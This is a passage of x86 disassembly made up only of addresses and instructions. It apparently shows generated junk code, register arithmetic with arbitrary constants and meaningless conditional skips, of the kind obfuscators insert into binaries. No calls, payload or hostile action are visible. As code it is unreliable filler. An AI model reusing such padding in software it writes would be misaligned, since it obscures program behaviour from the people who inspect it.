  404fe0:	jp     0x404ff0
  404fe2:	add    esi,0x2
  404fe8:	add    ebx,0x2
  404fee:	add    esi,edx
  404ff0:	mov    edi,0x48
  404ff5:	add    edx,edi
  404ff7:	sub    ebx,0x1
  404ffd:	or     edx,0x26
  405000:	mov    ebx,0xcd
  405005:	mov    ecx,0x1f
  40500a:	add    edi,esi
  40500c:	lea    ebp,ds:0xf3
  405012:	add    edi,0x2
  405018:	add    edi,esi
  40501a:	sub    ebx,0x1
  405020:	add    edi,esi
  405022:	add    ebx,esi
  405024:	lea    eax,ds:0x6d
  40502a:	sub    ebx,0x2
  405030:	add    ecx,ebx
  405032:	add    ebx,0x1
  405038:	mov    ebp,0x57
  40503d:	mov    eax,0xf3
  405042:	sub    edi,DWORD PTR ds:0x452729
  405048:	lea    ecx,[esi+0x2]
  40504e:	sub    ebp,0x1
  405054:	lea    esi,ds:0x0
  40505a:	mov    ecx,edi
  40505c:	mov    esi,0xf5
  405061:	mov    ebx,0x2a
  405066:	cmp    edx,0x881803ea
  40506c:	js     0x405073
  40506e:	or     esi,0x2a
  405071:	sub    edx,ecx
  405073:	lea    eax,[edx+0x0]
  405079:	add    edi,0x2
  40507f:	dec    ebp
  405080:	add    ebp,esi
  405082:	cmp    esi,DWORD PTR ds:0x450805
  405088:	sub    edi,0x2
  40508e:	add    esi,edx
  405090:	cmp    ecx,0x91d31de5
  405096:	js     0x40509a
  405098:	dec    edi
  405099:	inc    ebx
  40509a:	lea    esi,ds:0x53
  4050a0:	add    ecx,edx
  4050a2:	lea    eax,ds:0xa
  4050a8:	add    esi,0x1
  4050ae:	sub    ebp,0x1
  4050b4:	lea    ecx,ds:0xb
  4050ba:	mov    ebp,edi
  4050bc:	lea    esi,ds:0x8
  4050c2:	mov    esi,0xef
  4050c7:	add    edx,0x1
  4050cd:	sub    edx,0x1
  4050d3:	xor    ebx,DWORD PTR ds:0x46fa3d
  4050d9:	add    ecx,0x2
  4050df:	or     esi,DWORD PTR ds:0x43efa3
  4050e5:	sub    ebx,0x2
  4050eb:	or     ebp,0x2
  4050ee:	test   edi,ebx
  4050f0:	je     0x4050f5
  4050f2:	add    ebp,esi
  4050f4:	inc    ecx
  4050f5:	lea    ecx,[esi+0x83]
  4050fb:	dec    edx
  4050fc:	mov    edi,ecx
  4050fe:	mov    edx,0xb9
  405103:	cmp    edx,0x49
  405106:	jge    0x40510f
  405108:	or     esi,0x18
  40510b:	add    ebx,esi
  40510d:	inc    esi
  40510e:	inc    ebx
  40510f:	add    edi,0x2
  405115:	sub    esi,0x1
  40511b:	sub    edi,edx
  40511d:	or     ebp,0x3
  405120:	mov    esi,0x7a
  405125:	sub    edi,0x1
  40512b:	sub    edi,0x2
  405131:	add    ebx,ecx
  405133:	lea    eax,ds:0x6
  405139:	add    ebp,0x2
  40513f:	neg    edi
  405141:	mov    ebp,0x47
  405146:	add    edx,ebx
  405148:	sub    esi,0x1
  40514e:	xor    ebp,edx
  405150:	neg    ebp
  405152:	sub    esi,ebx
  405154:	cmp    esi,0x39a52ade
  40515a:	jp     0x405167
  40515c:	add    ebp,ecx
  40515e:	sub    edx,edi
  405160:	or     esi,0x36
  405163:	add    edx,ebx
  405165:	sub    edi,ebx
  405167:	or     ebp,0x3e
  40516a:	lea    edi,[ecx+0x90]
  405170:	mov    edx,0x5e
  405175:	sub    ecx,0x1
  40517b:	lea    ecx,[esi+0xc]
  405181:	add    esi,0x2
  405187:	mov    edx,0x10
  40518c:	add    ecx,esi
  40518e:	or     esi,0xf
  405191:	add    ebp,0x2
  405197:	mov    esi,0xba
  40519c:	add    edx,0x2
  4051a2:	lea    ebx,ds:0xf9
  4051a8:	sub    ecx,DWORD PTR ds:0x442bac
  4051ae:	sub    ebp,edx
  4051b0:	cmp    edi,0x5c
  4051b3:	jle    0x4051bf
  4051b5:	or     ebx,0x3a
  4051b8:	add    ecx,0x1
  4051be:	dec    ebx
  4051bf:	mov    edx,0x1f
  4051c4:	and    ebp,0xf5
  4051ca:	add    ebx,edx
  4051cc:	lea    ebx,ds:0x19
  4051d2:	mov    edi,0xea
  4051d7:	sub    ebx,0x1
  4051dd:	lea    edi,[ecx+0xd]
  4051e3:	inc    ecx
  4051e4:	sub    edi,0x2
  4051ea:	mov    esi,edx
  4051ec:	or     ebp,0x2b
  4051ef:	sub    ebp,0x1
  4051f5:	mov    ebp,0x6a
  4051fa:	mov    ecx,ebx
  4051fc:	xor    ecx,edx
  4051fe:	lea    edi,ds:0xc3
  405204:	sub    ebp,0x1
  40520a:	mov    ecx,0x8d
  40520f:	lea    ebp,ds:0xa
  405215:	add    edi,0x2
  40521b:	lea    ebx,ds:0xb
  405221:	or     ebx,0x47
  405224:	sub    esi,ebx
  405226:	add    ebx,edi
  405228:	mov    eax,0x6d
  40522d:	cmp    ebp,DWORD PTR ds:0x444211
  405233:	add    ebp,0x1
  405239:	lea    ebp,ds:0x43
  40523f:	lea    ebx,ds:0xc
  405245:	xor    ebx,ecx
  405247:	add    esi,0x1
  40524d:	xor    ecx,DWORD PTR ds:0x4521f5
  405253:	add    ecx,0x1
  405259:	sub    ebp,edi
  40525b:	add    ebx,0x1
  405261:	lea    edx,ds:0x46
  405267:	mov    ebx,ecx
  405269:	sbb    ecx,ebx
  40526b:	lea    ebx,ds:0xf
  405271:	add    ebp,edx
  405273:	add    edx,edi
  405275:	or     bl,bh
  405277:	dec    edx
  405278:	add    ecx,edi
  40527a:	lea    edi,ds:0x8
  405280:	add    ecx,ebx
  405282:	cmp    esi,0xf365afc5
  405288:	je     0x405292
  40528a:	add    ecx,0x1
  405290:	add    ebx,esi
  405292:	mov    esi,0x14
  405297:	sub    edi,0x1
  40529d:	add    edx,0x1
  4052a3:	lea    ecx,[edx+0x1]
  4052a9:	add    esi,0x1
  4052af:	sub    edx,0x2
  4052b5:	mov    edi,0xca
  4052ba:	add    edi,ecx
  4052bc:	add    ecx,edx
  4052be:	sub    edi,DWORD PTR ds:0x455d28
  4052c4:	or     ecx,DWORD PTR ds:0x47f749
  4052ca:	or     ebx,0x78
  4052cd:	add    edi,edx
  4052cf:	lea    edx,ds:0x3
  4052d5:	sub    ebp,ecx
  4052d7:	add    esi,0x1
  4052dd:	sub    ecx,0x2
  4052e3:	or     ebp,0xb
  4052e6:	sub    ebp,0x2
  4052ec:	lea    ecx,[edx+0x72]
  4052f2:	sub    edi,DWORD PTR ds:0x441b84
  4052f8:	mov    eax,0x22
  4052fd:	xor    ebx,ebp
  4052ff:	sub    ecx,0x1
  405305:	sub    edi,ebx
  405307:	or     esi,0x61
  40530a:	sub    ebx,0x2
  405310:	or     esi,DWORD PTR ds:0x472377
  405316:	add    ebp,edi
  405318:	or     esi,DWORD PTR ds:0x477dc0
  40531e:	sub    ecx,edx
  405320:	add    esi,ebx
  405322:	add    ecx,edi
  405324:	or     ebp,DWORD PTR ds:0x44d502
  40532a:	add    edi,edx
  40532c:	xchg   esi,ebx
  40532e:	cmp    ebx,0xffffffa8
  405331:	jle    0x40533a
  405333:	lea    ebp,[ebx+0x1]
  405339:	inc    esi
  40533a:	add    ecx,0x1
  405340:	cmp    dx,0xd97c
  405345:	jl     0x405350
  405347:	add    edi,0x1
  40534d:	mov    ecx,edx
  40534f:	inc    ecx
  405350:	sub    ecx,0x1
  405356:	add    edi,0x1
  40535c:	or     ebx,0x24
  40535f:	mov    ebx,0xa8
  405364:	or     ebx,ecx
  405366:	add    edi,edx
  405368:	add    ecx,0x2
  40536e:	mov    eax,0x44
  405373:	xor    esi,DWORD PTR ds:0x45a0ae
  405379:	sub    ebp,esi
  40537b:	sub    edi,ebx
  40537d:	add    edx,0x2
  405383:	cmp    edx,0x5f1fb3b1
  405389:	jp     0x405394
  40538b:	mov    dx,0x935d
  40538f:	mov    edx,0xf0
  405394:	lea    esi,ds:0x5
  40539a:	or     ebx,DWORD PTR ds:0x45e84c
  4053a0:	xor    esi,esi
  4053a2:	lea    eax,ds:0x5d
  4053a8:	sub    ebx,0x1
  4053ae:	sub    ebp,0x1
  4053b4:	mov    ebx,0xe1
  4053b9:	test   edi,edx
  4053bb:	je     0x4053c1
  4053bd:	or     ecx,0x4d
  4053c0:	dec    esi
  4053c1:	or     edi,DWORD PTR ds:0x467d5f
  4053c7:	lea    ebp,ds:0x4
  4053cd:	cmp    ebx,0xaf4c802a
  4053d3:	je     0x4053dd
  4053d5:	sub    esi,edx
  4053d7:	add    ebx,edx
  4053d9:	add    esi,ebx
  4053db:	inc    edx
  4053dc:	inc    edx
  4053dd:	lea    eax,[esi+0xd2]
  4053e3:	mov    edi,0xf7
  4053e8:	add    ebp,0x1
  4053ee:	sub    edx,0x2
  4053f4:	lea    edi,[edi+0x16]
  4053fa:	lea    esi,ds:0x59
  405400:	mov    si,0xdce7
  405404:	mov    esi,0x50
  405409:	lea    edi,[ebx+0x31]
  40540f:	or     ebp,0xa
  405412:	sub    edi,ebx
  405414:	lea    ebx,[edx+0x8]
  40541a:	sub    ebx,0x2
  405420:	mov    edx,0xe4
  405425:	lea    edi,[esi+0xd]
  40542b:	bswap  ecx
  40542d:	or     esi,0x64
  405430:	mov    ebx,0x52
  405435:	test   ebx,edi
  405437:	jne    0x40543c
  405439:	neg    ebx
  40543b:	cdq    
  40543c:	sub    edi,0x1
  405442:	add    ebp,edx
  405444:	sub    edx,0x1
  40544a:	mov    ebx,0x46
  40544f:	lea    edx,[edx+0xb]
  405455:	sub    ebx,0x2
  40545b:	lea    edx,ds:0x1
  405461:	lea    eax,[ebx+0x20]
  405467:	mov    eax,0x1f
  40546c:	add    ebx,ecx
  40546e:	cmp    si,0x2dbf
  405473:	jb     0x405477
  405475:	and    esi,ebx
  405477:	cmp    ebx,DWORD PTR ds:0x47ae04
  40547d:	add    esi,0x1
  405483:	lea    edi,ds:0x6e
  405489:	or     dl,ch
  40548b:	lea    ecx,[esi+0xf]
  405491:	lea    ebp,[esi+0xe0]
  405497:	or     ebp,DWORD PTR ds:0x4598eb
  40549d:	mov    ebp,0xb8
  4054a2:	lea    edx,ds:0xb6
  4054a8:	add    esi,edi
  4054aa:	sub    esi,0x2
  4054b0:	lea    eax,[edx+0x9d]
  4054b6:	sub    ecx,DWORD PTR ds:0x45d159
  4054bc:	neg    ebp
  4054be:	lea    esi,ds:0xdb
  4054c4:	or     edx,ecx
  4054c6:	or     edi,0x7e
  4054c9:	lea    edx,[edi+0xea]
  4054cf:	sub    ebx,edx
  4054d1:	or     esi,0xf
  4054d4:	mov    ebx,0xa7
  4054d9:	add    ecx,0x1
  4054df:	add    ecx,esi
  4054e1:	mov    eax,0xf4
  4054e6:	add    ebp,ecx
  4054e8:	sub    ebx,0x2
  4054ee:	mov    eax,ecx
  4054f0:	sbb    ebp,edi
  4054f2:	lea    ecx,[esi+0x39]
  4054f8:	add    edx,edi
  4054fa:	or     ecx,0x61
  4054fd:	lea    eax,[esi+0x5]
  405503:	mov    esi,edi
  405505:	or     edi,0x54
  405508:	add    ebx,esi
  40550a:	mov    esi,0xc6
  40550f:	sub    ebp,0x1
  405515:	sub    ecx,edx
  405517:	sub    ecx,0x1
  40551d:	lea    edx,ds:0x8d
  405523:	sub    ecx,ebx
  405525:	mov    esi,0x60
  40552a:	or     bp,si
  40552d:	test   edi,ecx
  40552f:	jne    0x405534
  405531:	sbb    edx,esi
  405533:	inc    edi
  405534:	add    ebp,edi
  405536:	inc    ecx
  405537:	mov    ecx,0x1a
  40553c:	xchg   edx,edx
  40553e:	sub    edi,0x1
  405544:	mov    eax,0x4c
  405549:	sub    edi,DWORD PTR ds:0x43bde6
  40554f:	sub    ebp,edx
  405551:	or     edx,DWORD PTR ds:0x459f59
  405557:	add    ebx,ecx
  405559:	lea    edx,ds:0xa
  40555f:	sub    esi,0x2
  405565:	or     edx,DWORD PTR ds:0x47c7d7
  40556b:	lea    edi,ds:0xa
  405571:	sbb    esi,edx
  405573:	lea    ebp,ds:0x40
  405579:	lea    ecx,ds:0xaf
  40557f:	mov    eax,0xa2
  405584:	lea    esi,[esi+0xe]
  40558a:	mov    esi,edx
  40558c:	lea    ecx,[ecx+0x0]
  405592:	mov    esi,0xd7
  405597:	test   ebx,edx
  405599:	je     0x40559e
  40559b:	dec    ebp
  40559c:	add    edx,ebx
  40559e:	sub    ebp,0x2
  4055a4:	cmp    ebx,DWORD PTR ds:0x47d1a2
  4055aa:	mov    ebp,0xb0
  4055af:	add    edi,ecx
  4055b1:	test   edx,ebx
  4055b3:	je     0x4055b7
  4055b5:	sub    edi,edx
  4055b7:	lea    ecx,ds:0xc5
  4055bd:	add    ecx,0x1
  4055c3:	xor    ecx,DWORD PTR ds:0x47bf71
  4055c9:	cmp    edi,0xa97c79ef
  4055cf:	jbe    0x4055d2
  4055d1:	dec    edi
  4055d2:	sub    edi,DWORD PTR ds:0x447575
  4055d8:	cmp    di,0xeeb5
  4055dd:	jns    0x4055e2
  4055df:	xchg   ecx,edx
  4055e1:	dec    ecx
  4055e2:	sub    edi,0x1
  4055e8:	sub    ebp,0x2
  4055ee:	sub    ebx,0x1
  4055f4:	lea    ecx,[esi+0x0]
  4055fa:	inc    edi
  4055fb:	or     ebp,0x3d
  4055fe:	add    ecx,0x2
  405604:	lea    edx,ds:0x1
  40560a:	mov    edi,0x45
  40560f:	mov    dx,0x2bb9
  405613:	sub    edx,DWORD PTR ds:0x475392
  405619:	cmp    si,0x273
  40561e:	jge    0x405626
  405620:	add    esi,edi
  405622:	or     edx,0x2e
  405625:	inc    edx
  405626:	add    edi,0x1
  40562c:	add    edi,ebx
  40562e:	sub    ebp,0x2
  405634:	sub    edx,DWORD PTR ds:0x459455
  40563a:	or     esi,0x6c
  40563d:	lea    ebp,ds:0xe
  405643:	inc    edx
  405644:	lea    edi,[edi+0x9a]
  40564a:	xchg   ebp,esi
  40564c:	add    ebp,edi
  40564e:	lea    edi,[esi+0xae]
  405654:	add    edi,0x2
  40565a:	mov    esi,0x46
  40565f:	bswap  esi
  405661:	mov    esi,edi
  405663:	lea    edx,ds:0xc5
  405669:	lea    ecx,ds:0x8
  40566f:	mov    ecx,esi
  405671:	lea    ebx,[ecx+0xb]
  405677:	lea    esi,ds:0xf
  40567d:	or     edx,0x3a
  405680:	mov    edi,0x23
  405685:	mov    edx,0x37
  40568a:	or     bp,cx
  40568d:	mov    ebx,0x61
  405692:	dec    ecx
  405693:	mov    ebx,edi
  405695:	xor    ebp,DWORD PTR ds:0x444bfe
  40569b:	sub    ecx,0x2
  4056a1:	lea    esi,ds:0xd
  4056a7:	neg    edx
  4056a9:	add    esi,0x2
  4056af:	lea    ebx,ds:0x44
  4056b5:	mov    ebp,0x7b
  4056ba:	sub    edi,0x1
  4056c0:	and    ebp,ecx
  4056c2:	not    ebx
  4056c4:	add    ebx,esi
  4056c6:	test   ebx,edi
  4056c8:	je     0x4056cd
  4056ca:	add    ecx,edx
  4056cc:	dec    ecx
  4056cd:	cmp    ebx,0xffffffe6
  4056d0:	je     0x4056e2
  4056d2:	lea    ebp,ds:0x9
  4056d8:	not    edi
  4056da:	or     ecx,0x26
  4056dd:	add    edx,ecx
  4056df:	sub    ecx,esi
  4056e1:	dec    ecx
  4056e2:	lea    edx,[esi+0xef]
  4056e8:	add    edi,0x1
  4056ee:	or     ebx,0x6b
  4056f1:	lea    edx,ds:0x73
  4056f7:	lea    edi,[esi+0x4d]
  4056fd:	add    edi,0x1
  405703:	mov    ecx,0xe7
  405708:	lea    edx,ds:0x1
  40570e:	cmp    esi,0xffffffea
  405711:	jl     0x40571c
  405713:	mov    eax,0xb1
  405718:	or     ebx,0x51
  40571b:	dec    esi
  40571c:	add    ecx,0x2
  405722:	lea    edx,ds:0xf1
  405728:	mov    ecx,0x95
  40572d:	sub    ecx,0x1
  405733:	or     ebx,0x5b
  405736:	xor    esi,DWORD PTR ds:0x47cfbd
  40573c:	mov    eax,0x4f
  405741:	add    ecx,ebx
  405743:	add    ebp,0x2
  405749:	or     ebx,0x32
  40574c:	add    edx,esi
  40574e:	lea    esi,[edx+0x7]
  405754:	lea    esi,ds:0xde
  40575a:	cmp    dx,0x8194
  40575f:	ja     0x405767
  405761:	lea    eax,ds:0x1
  405767:	add    esi,0x2
  40576d:	add    edi,esi
  40576f:	sub    edi,edx
  405771:	mov    ax,0x6c78
  405775:	cmp    esi,0xffffffae
  405778:	jle    0x405780
  40577a:	lea    eax,[ebx+0xd]
  405780:	lea    eax,[ebx+0x2]
  405786:	add    esi,0x2
  40578c:	lea    ebx,[edi+0x99]
  405792:	sub    ecx,0x2
  405798:	mov    edx,0x47
  40579d:	sub    edi,0x1
  4057a3:	mov    ecx,0xf0
  4057a8:	lea    edx,ds:0x0
  4057ae:	mov    ebx,esi
  4057b0:	mov    ebp,ecx
  4057b2:	add    edx,ecx
  4057b4:	xor    ebx,ecx
  4057b6:	sub    edi,ecx
  4057b8:	mov    esi,0xdb
  4057bd:	add    edx,edi
  4057bf:	add    ecx,0x1
  4057c5:	lea    eax,[esi+0x48]
  4057cb:	mov    ecx,edi
  4057cd:	xor    esi,edi
  4057cf:	mov    ecx,esi
  4057d1:	xor    edx,DWORD PTR ds:0x454ac9
  4057d7:	add    edi,0x1
  4057dd:	mov    eax,edx
  4057df:	sub    ebp,0x1
  4057e5:	lea    ebx,ds:0x1
  4057eb:	seta   cl
  4057ee:	cmp    edx,DWORD PTR ds:0x455d73
  4057f4:	mov    ebp,ebx
  4057f6:	sub    edi,0x2
  4057fc:	add    edx,ebx
  4057fe:	add    edx,0x1
  405804:	sets   al
  405807:	sub    ebx,0x1
  40580d:	inc    ebx
  40580e:	or     ecx,0x31
  405811:	add    edx,ecx
  405813:	inc    edi
  405814:	sbb    ecx,edx
  405816:	sub    edx,0x2
  40581c:	add    esi,0x1
  405822:	cmp    ebx,DWORD PTR ds:0x4524b9
  405828:	not    edx
  40582a:	sub    edx,0x1
  405830:	add    edx,0x1
  405836:	cmp    edi,DWORD PTR ds:0x47acf1
  40583c:	mov    ebp,0x32
  405841:	add    ecx,0x1
  405847:	sub    ebp,esi
  405849:	sub    ecx,0x2
  40584f:	sub    edi,0x2
  405855:	or     cl,cl
  405857:	mov    di,0xa035
  40585b:	mov    esi,0x84
  405860:	mov    esi,ebx
  405862:	add    ebx,ecx
  405864:	cmp    edx,0x1b0d20fc
  40586a:	jae    0x405878
  40586c:	lea    ebx,[edx+0xe]
  405872:	sub    ecx,0x2
  405878:	lea    ebx,[ecx+0x45]
  40587e:	mov    edx,ecx
  405880:	cmp    esi,0x46f617c6
  405886:	jg     0x40588c
  405888:	xor    ebp,edi
  40588a:	sub    ecx,ebx
  40588c:	lea    ebp,ds:0x9a
  405892:	cmp    ebx,0xa5983d60
  405898:	ja     0x40589e
  40589a:	add    ebx,esi
  40589c:	mov    ecx,ebx
  40589e:	inc    edi
  40589f:	add    edi,edx
  4058a1:	mov    esi,0x90
  4058a6:	lea    edi,ds:0xe6
  4058ac:	add    edx,ebx
  4058ae:	mov    ebp,ebx
  4058b0:	add    esi,ecx
  4058b2:	sub    ebx,0x2
  4058b8:	add    ecx,0x2
  4058be:	or     cx,si
  4058c1:	add    esi,edx
  4058c3:	lea    ebx,ds:0xf
  4058c9:	add    ecx,edx
  4058cb:	mov    edi,esi
  4058cd:	sub    edx,esi
  4058cf:	add    ebx,0x2
  4058d5:	lea    edx,ds:0xa6
  4058db:	lea    edi,ds:0x6
  4058e1:	sub    esi,0x1
  4058e7:	lea    edx,ds:0x23
  4058ed:	sub    esi,0x1
  4058f3:	lea    edi,ds:0x7
  4058f9:	neg    edi
  4058fb:	add    ecx,0x1
  405901:	xor    edx,DWORD PTR ds:0x43c2a5
  405907:	mov    ebx,0xb9
  40590c:	sub    edi,0x2
  405912:	or     esi,0x6
  405915:	lea    ebx,[ebx+0xe]
  40591b:	sub    ebp,edi
  40591d:	sub    edx,ecx
  40591f:	lea    eax,[ecx+0xe]
  405925:	sub    edx,0x2
  40592b:	sub    ebp,0x1
  405931:	lea    edx,ds:0xb
  405937:	lea    ecx,[edx+0x8a]
  40593d:	mov    ecx,edx
  40593f:	or     edi,DWORD PTR ds:0x46ef7f
  405945:	cmp    esi,DWORD PTR ds:0x45f104
  40594b:	sub    edx,ecx
  40594d:	lea    edi,ds:0xc
  405953:	cmp    ebp,DWORD PTR ds:0x46f2ca
  405959:	lea    edx,[ecx+0xff]
  40595f:	sbb    esi,edx
  405961:	lea    ebx,ds:0x8c
  405967:	lea    ecx,[edi+0x5]
  40596d:	lea    ecx,ds:0x62
  405973:	mov    ecx,0xd8
  405978:	mov    esi,0x93
  40597d:	cmp    edx,DWORD PTR ds:0x45eb92
  405983:	add    ebx,esi
  405985:	lea    ebp,ds:0x2b
  40598b:	add    ebx,0x1
  405991:	xor    ecx,edi
  405993:	mov    ebx,0x6b
  405998:	or     dl,bl
  40599a:	mov    ecx,edx
  40599c:	cmp    edx,0x4a
  40599f:	jl     0x4059a7
  4059a1:	add    ebx,esi
  4059a3:	mov    ebp,ecx
  4059a5:	add    edx,edi
  4059a7:	dec    ebp
  4059a8:	lea    edx,ds:0x3
  4059ae:	add    ebp,ecx
  4059b0:	lea    esi,ds:0xca
  4059b6:	cmp    edi,0xffffffb0
  4059b9:	jge    0x4059cb
  4059bb:	or     esi,0x2b
  4059be:	mov    ecx,esi
  4059c0:	sub    ebx,0x1
  4059c6:	mov    esi,ebx
  4059c8:	xchg   ecx,ebp
  4059ca:	inc    ebp
  4059cb:	lea    edx,ds:0xb6
  4059d1:	lea    edi,ds:0xc7
  4059d7:	add    edi,0x1
  4059dd:	mov    ecx,ebx
  4059df:	or     edx,edx
  4059e1:	add    ecx,esi
  4059e3:	mov    ebx,0xbb
  4059e8:	lea    ebx,ds:0x5
  4059ee:	mov    ebx,0x6c
  4059f3:	add    ebx,ecx
  4059f5:	mov    eax,0x21
  4059fa:	setb   cl
  4059fd:	lea    edx,ds:0xd
  405a03:	sub    edx,edi
  405a05:	sub    edx,0x2
  405a0b:	sub    ebp,0x2
  405a11:	add    ebx,0x1
  405a17:	sub    esi,DWORD PTR ds:0x45821a
  405a1d:	sub    ecx,0x1
  405a23:	cmp    edx,0xffffffbc
  405a26:	jle    0x405a2f
  405a28:	mov    edi,0xb6
  405a2d:	mov    esi,edx
  405a2f:	lea    ecx,ds:0x1e
  405a35:	sub    edi,0x1
  405a3b:	not    ebp
  405a3d:	or     edi,0x45
  405a40:	mov    eax,0xb4
  405a45:	sbb    ebp,ecx
  405a47:	test   ebx,esi
  405a49:	jne    0x405a4d
  405a4b:	mov    ebp,esi
  405a4d:	and    edi,0x3f
  405a53:	mov    ebp,0x7c
  405a58:	add    ecx,0x2
  405a5e:	lea    ebx,[edx+0xf]
  405a64:	sub    esi,edx
  405a66:	inc    edi
  405a67:	sub    ecx,0x1
  405a6d:	mov    edx,0x8
  405a72:	or     edx,0x2c
  405a75:	xor    esi,DWORD PTR ds:0x461af1
  405a7b:	xor    esi,edi
  405a7d:	inc    ebx
  405a7e:	mov    edx,esi
  405a80:	lea    ebx,[ecx+0xd]
  405a86:	lea    edi,ds:0x9
  405a8c:	mov    esi,0x79
  405a91:	sub    ebp,ebx
  405a93:	add    ecx,0x1
  405a99:	add    edi,0x2
  405a9f:	or     edx,0x56
  405aa2:	or     ebx,0x40
  405aa5:	inc    edi
  405aa6:	sub    ebp,0x2
  405aac:	lea    esi,[esi+0x4]
  405ab2:	add    edi,0x2
  405ab8:	xchg   ecx,ebx
  405aba:	lea    eax,[ecx+0xdc]
  405ac0:	xor    ecx,DWORD PTR ds:0x4513ec
  405ac6:	or     ebx,0x5b
  405ac9:	lea    ebx,[esi+0x9]
  405acf:	add    ecx,edi
  405ad1:	mov    ecx,esi
  405ad3:	lea    esi,[edx+0xe]
  405ad9:	xchg   ecx,edi
  405adb:	sub    esi,ebx
  405add:	lea    ebx,[edi+0xd]
  405ae3:	sub    esi,0x1
  405ae9:	sub    ecx,DWORD PTR ds:0x46dcea
  405aef:	cmp    edx,0x4c6ca65a
  405af5:	je     0x405afc
  405af7:	xor    edx,ebp
  405af9:	dec    ebx
  405afa:	add    edx,ecx
  405afc:	sub    ebx,0x2
  405b02:	add    edx,edi
  405b04:	bsr    edi,edx
  405b07:	add    ecx,0x1
  405b0d:	add    ebp,0x2
  405b13:	lea    esi,[ebx+0xda]
  405b19:	cmp    ebx,DWORD PTR ds:0x45624e
  405b1f:	add    ebx,0x1
  405b25:	mov    edi,0xbb
  405b2a:	lea    edx,[esi+0x5]
  405b30:	sub    esi,0x2
  405b36:	mov    esi,0xbb
  405b3b:	lea    ebx,ds:0xf
  405b41:	mov    ecx,edi
  405b43:	add    edx,0x2
  405b49:	sub    edi,ecx
  405b4b:	or     ebx,0x6b
  405b4e:	mov    ebx,0xbc
  405b53:	sub    ebx,0x2
  405b59:	or     ebx,DWORD PTR ds:0x43f41d
  405b5f:	add    ebp,edx
  405b61:	add    ebp,edx
  405b63:	add    edx,edi
  405b65:	bswap  ebx
  405b67:	bsr    edx,ecx
  405b6a:	mov    eax,0xba
  405b6f:	lea    eax,ds:0x6
  405b75:	mov    ecx,0x4b
  405b7a:	sub    esi,edi
  405b7c:	lea    ebx,[ecx+0xef]
  405b82:	cmp    edi,0xeabdbed5
  405b88:	jbe    0x405b97
  405b8a:	add    edi,0x2
  405b90:	sub    esi,0x1
  405b96:	dec    edx
  405b97:	sub    ebp,DWORD PTR ds:0x463e64
  405b9d:	or     edi,0x7
  405ba0:	lea    eax,[ebx+0xe9]
  405ba6:	sub    ebp,0x1
  405bac:	lea    ebx,ds:0xd
  405bb2:	sub    ecx,0x2
  405bb8:	or     dl,ah
  405bba:	lea    eax,ds:0xe
  405bc0:	add    ebx,edx
  405bc2:	sub    esi,0x1
  405bc8:	sub    ecx,0x2
  405bce:	sub    ebx,edi
  405bd0:	lea    esi,ds:0x49
  405bd6:	sub    ecx,0x2
  405bdc:	sub    esi,0x2
  405be2:	add    edx,0x1
  405be8:	lea    ebp,ds:0xa1
  405bee:	mov    esi,ecx
  405bf0:	cmp    esi,0x486aeb50
  405bf6:	ja     0x405c02
  405bf8:	lea    ebx,ds:0xb
  405bfe:	or     cx,sp
  405c01:	dec    edx
  405c02:	dec    edi
  405c03:	sub    ecx,0x1
  405c09:	mov    dx,0xb4cd
  405c0d:	add    ebp,ebx
  405c0f:	or     edi,0x17
  405c12:	lea    edi,ds:0xf8
  405c18:	bsr    ecx,esi
  405c1b:	mov    ebp,0xec
  405c20:	lea    ebp,ds:0x4
  405c26:	add    edi,0x2
  405c2c:	xor    ecx,ebp
  405c2e:	inc    edx
  405c2f:	lea    ebx,ds:0xad
  405c35:	add    ecx,0x1
  405c3b:	dec    ecx
  405c3c:	sub    edi,ecx
  405c3e:	lea    ebx,[edx+0x2]
  405c44:	sub    esi,0x1
  405c4a:	cmp    ecx,0x46
  405c4d:	ja     0x405c5b
  405c4f:	add    edx,ebx
  405c51:	sub    edi,ebx
  405c53:	add    edx,edi
  405c55:	cmp    edi,DWORD PTR ds:0x46112e
  405c5b:	add    ebp,0x2
  405c61:	mov    eax,0xfc
  405c66:	mov    ebx,0x2f
  405c6b:	sub    ebx,0x1
  405c71:	lea    ebx,ds:0x8a
  405c77:	mov    ecx,esi
  405c79:	test   ecx,edx
  405c7b:	je     0x405c81
  405c7d:	add    ebp,esi
  405c7f:	add    edi,ebx
  405c81:	mov    dx,0x3931
  405c85:	xor    ecx,DWORD PTR ds:0x44229c
  405c8b:	mov    eax,ecx
  405c8d:	or     ebx,0x7d
  405c90:	lea    edi,ds:0xf
  405c96:	cmp    ecx,0x3c5903b5
  405c9c:	jg     0x405c9f
  405c9e:	inc    ecx
  405c9f:	lea    ebx,ds:0xc
  405ca5:	add    ebp,0x2
  405cab:	sub    ebp,0x1
  405cb1:	or     esi,0x2a
  405cb4:	mov    esi,0x86
  405cb9:	add    edi,ecx
  405cbb:	mov    ecx,0xa8
  405cc0:	sub    ecx,esi
  405cc2:	lea    edx,ds:0xc6
  405cc8:	add    ebp,0x1
  405cce:	add    ebx,0x1
  405cd4:	add    edi,edx
  405cd6:	sub    edx,0x2
  405cdc:	sub    esi,0x1
  405ce2:	sub    edi,DWORD PTR ds:0x4678dc
  405ce8:	movzx  edx,bx
  405ceb:	sub    edx,0x1
  405cf1:	sub    ecx,0x2
  405cf7:	test   edx,ecx
  405cf9:	je     0x405cfe
  405cfb:	not    esi
  405cfd:	inc    ebp
  405cfe:	sub    edi,DWORD PTR ds:0x455ea9
  405d04:	mov    dx,0x67dc
  405d08:	cmp    ebx,0xffffffb2
  405d0b:	jae    0x405d17
  405d0d:	sub    edx,0x2
  405d13:	add    esi,ecx
  405d15:	or     edx,ebp
  405d17:	sub    ebx,esi
  405d19:	add    ebx,0x1
  405d1f:	sub    ecx,0x1
  405d25:	mov    ebx,0x83
  405d2a:	sub    edx,0x2
  405d30:	add    edi,0x1
  405d36:	mov    ecx,0xb2
  405d3b:	add    ebx,ecx
  405d3d:	lea    esi,ds:0x45
  405d43:	mov    edx,0xba
  405d48:	lea    ebx,ds:0x40
  405d4e:	lea    esi,ds:0x9d
  405d54:	neg    ebp
  405d56:	add    ecx,0x2
  405d5c:	inc    esi
  405d5d:	cmp    edi,DWORD PTR ds:0x45d470
  405d63:	xor    esi,ebp
  405d65:	lea    eax,ds:0x28
  405d6b:	or     edi,0x36
  405d6e:	lea    ecx,ds:0xa6
  405d74:	or     ebp,0x30
  405d77:	xor    ebp,DWORD PTR ds:0x47039a
  405d7d:	lea    ecx,ds:0x5
  405d83:	add    ecx,ebx
  405d85:	add    esi,0x2
  405d8b:	lea    ebx,[ebx+0x16]
  405d91:	lea    edi,ds:0x6
  405d97:	lea    edi,ds:0xe
  405d9d:	sub    ecx,DWORD PTR ds:0x44d36a
